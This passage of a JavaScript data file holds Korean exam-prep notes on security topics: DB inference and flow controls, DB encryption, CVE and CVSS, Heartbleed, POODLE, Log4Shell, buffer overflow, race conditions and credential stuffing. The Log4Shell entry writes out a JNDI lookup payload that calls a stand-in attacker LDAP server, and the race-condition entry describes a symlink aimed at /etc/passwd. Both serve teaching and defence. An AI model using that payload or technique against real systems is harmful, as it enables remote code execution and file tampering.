     n("infer","추론 (Inference) 공격",["기밀 정보 자체를 보지 않고도 주변 정보로 기밀을 짐작할 수 있어서, 집합성 공격과 구분하는 문제로 나온다.","추론(Inference) 공격은 기밀이 아닌 정보를 보고 기밀 정보를 유추하는 공격이다.","예를 들어 임원 전용기의 예약 목적지를 보고 비밀 인수 협상 상대를 알아낸다.","핵심은 다른 정보를 보고 짐작한다는 점이며, 대응은 추론 통제이다."],[],1),
     n("diddle","데이터 디들링 (Data Diddling)",["데이터 디들링은 처리 전에 자료를 몰래 바꿔 결과를 조작하는 공격으로, 이름이 낯설어 단답형으로 나오기 좋다.","데이터 디들링(Data Diddling)은 처리할 자료를 다른 자료로 바꿔치기해서 처리되게 하는 공격으로, 입력 단계에서 일어나는 변조이다.","예를 들어 급여 입력 직전에 금액을 바꾸거나, 의사결정에 쓰이는 지표를 바꾼다.","diddle은 '속이다, 조작하다'라는 뜻이다."],[],1)
    ],1),
    n("dbctl","DB 보안 통제 3가지 (11회)",["DB에서 정보가 새는 길은 하나가 아니므로 길마다 다른 통제가 필요하며, 11회에 출제되었다.","답은 모두 '○○ 통제' 형태이다. 직접 보기, 간접적으로 알아내기, 밖으로 새기라는 세 길을 각각 접근 통제, 추론 통제, 흐름 통제로 하나씩 막는다."],[
     n("accctl","접근 통제",["권한 없는 사람이 데이터를 직접 보는 것을 막는 가장 기본적인 통제이다.","접근 통제는 누가 어느 테이블에 무엇을 할 수 있는지 권한을 관리하는 것으로, `GRANT`·`REVOKE`를 쓴다.","볼 권한이 없는 데이터를 직접 보는 길을 막는다."]),
     n("infctl","추론 통제",["직접 보는 것을 막아도, 볼 수 있는 정보를 조합하면 숨긴 정보가 드러날 수 있어서 추론 통제가 필요하다.","추론 통제는 볼 수 있는 데이터를 조합해 볼 수 없는 민감 정보를 알아내는 것을 막는다.","예를 들어 부서 평균 급여와 인원 수를 알면, 1인 부서의 경우 그 사람의 개인 급여가 그대로 드러난다.","대응은 허용하는 질의를 제한하고 응답 데이터를 한정하는 것이다."],[],1),
     n("flowctl","흐름 통제",["권한 있는 사람이라도 기밀 정보를 낮은 등급 저장소로 옮기면 유출로 이어지므로 정보가 흐르는 방향을 통제해야 한다.","흐름 통제는 높은 등급(기밀) 정보가 낮은 등급 저장소로 흘러가는 것을 검사한다.","예를 들어 기밀 테이블을 아무나 볼 수 있는 테이블로 복사하는 것을 차단한다."],[],1)
    ],1),
    n("dbenc","DB 암호화 방식 (24회)",["DB가 털리더라도 데이터를 읽지 못하게 하려면 암호화가 필요하며, 어디서 암호화하느냐에 따라 성능과 수정 범위가 달라져 24회에 출제되었다.","DB 암호화 방식은 암호화를 어디에서 하느냐에 따라 나뉜다. 애플리케이션 서버, DB 서버, DBMS 내부, OS 순으로 점점 아래 단계로 내려간다."],[
     n("encapi","API (Application Programming Interface) 방식",["애플리케이션 단계에서 암호화하는 방식으로, DB 서버 부담과 코드 수정 사이의 장단점을 비교하는 문제로 나온다.","API(Application Programming Interface) 방식은 암호화 모듈을 라이브러리로 애플리케이션 서버에 설치하고, 프로그램이 직접 호출해 암호화한 뒤 DB에 저장하는 방식이다.","장점은 DB 서버에 부담이 없다는 것이고, 단점은 애플리케이션 코드를 고쳐야 한다는 것이다."],[],1),
     n("encplug","Plug-in 방식",["애플리케이션 코드를 크게 고치기 어려울 때 쓰는 방식으로, API 방식과 장단점이 반대여서 비교 문제로 나온다.","Plug-in 방식은 암호화 모듈을 DB 서버에 설치하고 DBMS가 플러그인으로 호출하는 방식이다.","장점은 애플리케이션 코드 수정이 적다는 것이고, 단점은 DB 서버에 부담이 간다는 것이다.","API 방식과 Plug-in 방식을 함께 쓰는 것을 Hybrid 방식이라고 한다."]),
     n("enctde","TDE (Transparent Data Encryption) 방식",["애플리케이션을 전혀 고치지 않고 DB 자체 기능으로 암호화할 수 있어 많이 쓰이는 방식이다.","TDE(Transparent Data Encryption) 방식은 DBMS에 내장된 암호화 기능을 쓰는 방식이다.","파일에 쓸 때 암호화하고 읽을 때 복호화하므로 애플리케이션은 암호화 사실을 모른다. 그래서 '투명(Transparent)'하다고 한다.","예로 Oracle TDE, MS-SQL TDE가 있다."],[],1),
     n("encos","운영체제 방식",["DB 암호화 방식 가운데 가장 아래 단계로, 다른 방식과 위치를 구분하는 문제로 나온다.","운영체제 방식은 OS의 파일 입출력 단계에서 디스크나 파일 단위로 암호화하는 방식이다."])
    ],1)
   ])
  ]),
  n("s3c2","2장 애플리케이션 보안 취약점",["취약점은 전 세계가 같은 이름과 같은 기준으로 불러야 관리하고 대응할 수 있으므로, 이름 붙이는 체계와 유명 취약점을 알아 두어야 한다.","2장은 취약점 번호 체계인 CVE, 심각도 점수 체계인 CVSS, 그리고 하트블리드·Log4Shell·POODLE 같은 대표 취약점을 다룬다."],[
   n("cve","CVE (Common Vulnerabilities and Exposures)",["같은 취약점을 나라와 회사마다 다르게 부르면 혼란이 생기므로, 전 세계가 같은 이름으로 부르기 위해 CVE가 만들어졌으며 4회에 출제되었다.","CVE(Common Vulnerabilities and Exposures)는 공개된 취약점에 붙는 고유 번호이다.","형식은 `CVE-연도-번호`이다. 예를 들어 `CVE-2014-6271`은 Shellshock이다.","연도는 취약점이 등록되어 번호를 받은 해이고, 번호는 그 해의 일련번호(4자리 이상)이다.","미국 MITRE가 운영한다."],[],1),
   n("cvss","CVSS (Common Vulnerability Scoring System)",["취약점이 많을 때 무엇부터 패치할지 정하려면 심각도를 숫자로 비교할 기준이 필요하며, 17회에 출제되었다.","CVSS(Common Vulnerability Scoring System)는 취약점 점수 체계이다. CVE가 번호(이름)라면 CVSS는 0부터 10까지의 심각도 점수이고, 10이 가장 심각하다.","기본(Base) 점수는 취약점 자체의 위험도를 나타낸다.","시간(Temporal) 점수는 공격 코드가 나왔는지, 패치가 있는지처럼 시간에 따라 바뀌는 요소를 반영한다.","환경(Environmental) 점수는 우리 회사 환경에서 그 취약점이 얼마나 중요한지를 반영한다."],[],1),
   n("heartbleed","하트블리드 (Heartbleed)",["하트블리드는 인터넷 암호 통신에 널리 쓰이는 OpenSSL에서 서버 메모리가 새어 나간 대형 사건으로, 23회에 출제되었다.","하트블리드(Heartbleed)는 `CVE-2014-0160`으로, OpenSSL의 Heartbeat 확장 기능에 있던 취약점이다.","정상적으로는 클라이언트가 \"bird(4글자)\"를 보내면 서버가 그대로 \"bird\"를 돌려준다. 연결이 살아 있는지 확인하는 용도이다.","공격자는 \"bird(500글자)\"처럼 길이를 속여 보낸다. 서버는 길이를 검증하지 않고 메모리에서 500글자를 읽어 돌려주므로, 비밀번호·쿠키·개인키까지 딸려 나온다(최대 64KB).","대응은 OpenSSL을 1.0.1g 이상으로 패치하고 인증서를 재발급하는 것이다."],[],1),
   n("poodle","POODLE (Padding Oracle On Downgraded Legacy Encryption)",["POODLE은 오래된 SSL 3.0이 남아 있으면 최신 TLS를 써도 강제로 낮은 버전으로 끌어내려 공격할 수 있음을 보여 준 사례로, 15회에 출제되었다.","POODLE(Padding Oracle On Downgraded Legacy Encryption)은 중간자가 TLS 연결을 일부러 실패시켜 SSL 3.0으로 내려가게(다운그레이드) 한 뒤, CBC 패딩 검사의 빈틈을 이용해 암호문을 한 바이트씩 풀어내는 공격이다. 주로 쿠키 탈취에 쓰인다.","패딩 오라클이란 서버가 패딩이 맞는지 아닌지 대답해 주는 것을 힌트로 삼는 공격을 말한다.","대응은 SSL 3.0을 비활성화하고, 다운그레이드를 막는 `TLS_FALLBACK_SCSV`를 쓰는 것이다."],[],1),
   n("log4j","Log4j · Log4Shell",["Log4j는 수많은 자바 프로그램이 쓰는 라이브러리여서 취약점의 영향 범위가 엄청났고 CVSS 10.0을 받았으며, 24회에 출제되었다.","Log4j는 아파치의 자바 로깅 라이브러리이고, 이 라이브러리의 취약점 이름이 Log4Shell(`CVE-2021-44228`, CVSS 10.0)이다.","정상적으로 Log4j는 로그 문자열 안의 `${...}`를 편의 기능으로 해석해 값을 채워 넣는다. 이 기능을 Lookup이라고 한다.","공격자는 User-Agent처럼 로그에 남을 값에 `${jndi:ldap://공격자서버/a}`를 넣는다. 로그를 남기는 순간 JNDI가 공격자의 LDAP 서버에서 자바 클래스를 받아 실행하므로 원격 코드 실행(RCE)이 일어난다.","대응은 Log4j를 2.17 이상으로 업데이트하고 JNDI Lookup을 비활성화하는 것이다."],[],1)
  ]),
  n("s3c3","3장 시스템 공격 기법",["웹 취약점 외에도 메모리나 권한, 사람의 신뢰를 노리는 시스템 공격이 많아서, 대표 기법과 분석 모델을 함께 알아 두어야 한다.","3장은 메모리를 넘치게 하거나 권한을 빼앗는 공격과 함께 공급망 공격, APT, 레이스 컨디션, 크리덴셜 스터핑, DDE, TEMPEST, 그리고 분석 틀인 MITRE ATT&CK과 사이버 킬 체인을 다룬다."],[
   n("memarea","메모리 영역 (9회)",["버퍼 오버플로 같은 메모리 공격을 이해하려면 프로그램이 메모리를 어떻게 나눠 쓰는지 먼저 알아야 하며, 9회에 출제되었다.","프로그램이 실행되면 메모리를 용도별로 나눠 쓰며, 그 가운데 스택과 힙이 공격의 주요 무대가 된다."],[
    n("stack","스택 (Stack)",["스택에는 함수가 끝난 뒤 돌아갈 주소가 저장되어 있어서, 이 주소를 덮어쓰는 공격의 대상이 된다.","스택(Stack)은 함수를 호출할 때 생기는 지역 변수, 매개변수, 복귀 주소(Return Address)를 저장하는 영역이다. 함수가 끝나면 자동으로 사라진다.","스택 버퍼 오버플로는 지역 배열이 넘쳐 복귀 주소를 덮어쓰는 공격으로, 이 영역에서 일어난다."]),
    n("heap","힙 (Heap)",["힙은 프로그램이 필요할 때 직접 잡아 쓰는 메모리여서, 스택과 구별해 묻는 문제가 나온다.","힙(Heap)은 `malloc`·`new`로 동적으로 할당한 메모리 영역이며, `free`·`delete`로 해제할 때 사라진다.","힙 버퍼 오버플로는 이 영역에서 일어난다."])
   ]),
   n("bof","버퍼 오버플로 (Buffer Overflow)",["버퍼 오버플로는 공격자가 프로그램의 실행 흐름을 빼앗아 자기 코드를 실행시키는 대표적인 시스템 공격으로, 4회에 출제되었다.","정상적으로 `char p[4]`에는 4바이트만 들어간다.","그런데 `strcpy`는 길이를 검사하지 않고 끝(`\\0`)까지 복사하므로, 넘친 데이터가 옆의 메모리와 함수의 복귀 주소(Return Address)를 덮어쓴다. 그러면 함수가 끝날 때 공격자 코드로 점프하게 된다.","취약한 함수는 `strcpy`, `strcat`, `gets`, `sprintf`, `scanf(%s)`이고, 이를 대신할 안전한 함수는 `strncpy`, `strncat`, `fgets`, `snprintf`이다.","보호 기법으로는 스택 가드(카나리 값), ASLR(주소 무작위화), NX·DEP(데이터 영역 실행 금지)가 있다."]),
   n("race","레이스 컨디션 (Race Condition)",["레이스 컨디션은 root 권한 프로그램의 짧은 틈을 노려 일반 사용자가 중요 파일을 바꾸게 하는 권한 상승 공격으로, 19회에 출제되었다.","레이스 컨디션(Race Condition)은 두 프로세스가 같은 자원(임시 파일)을 두고 경주하는 틈을 노리는 공격이다.","정상적으로는 root 권한(SetUID) 프로그램이 `/tmp`에 임시 파일을 만들고, 내용을 쓴 뒤 지운다.","공격자는 임시 파일 이름을 알아낸 뒤, 그 이름으로 `/etc/passwd` 등을 가리키는 심볼릭 링크를 먼저 만든다. 프로그램은 그것을 임시 파일로 알고 root 권한으로 쓰기 때문에 실제로는 중요 파일이 바뀐다.","대응은 임시 파일을 예측할 수 없는 이름으로 만들고(`mkstemp`), 열기 전에 심볼릭 링크인지 확인하며, SetUID 프로그램을 최소화하는 것이다."],[],1),
   n("credstuff","크리덴셜 스터핑 (Credential Stuffing)",["대형 유출 사고로 퍼진 계정 목록이 다른 사이트 침해로 이어지기 때문에 자주 문제가 되며, 17회에 출제되었다.","크리덴셜 스터핑(Credential Stuffing)은 다른 사이트에서 유출된 아이디·비밀번호 목록을 다른 사이트에 대입해 로그인하는 공격이다.","사람들이 여러 사이트에 같은 비밀번호를 쓰기 때문에 성공한다. credential은 '자격 증명', stuffing은 '채워 넣기'라는 뜻이다.","무차별 대입(Brute Force)은 가능한 조합을 전부 시도하는 것이고, 패스워드 스프레이는 흔한 비밀번호 하나로 여러 계정을 시도하는 것이어서 서로 구분해야 한다.","대응은 사이트마다 다른 비밀번호 쓰기, 다중 인증(MFA), 로그인 실패 횟수 제한과 CAPTCHA이다."],[],1),
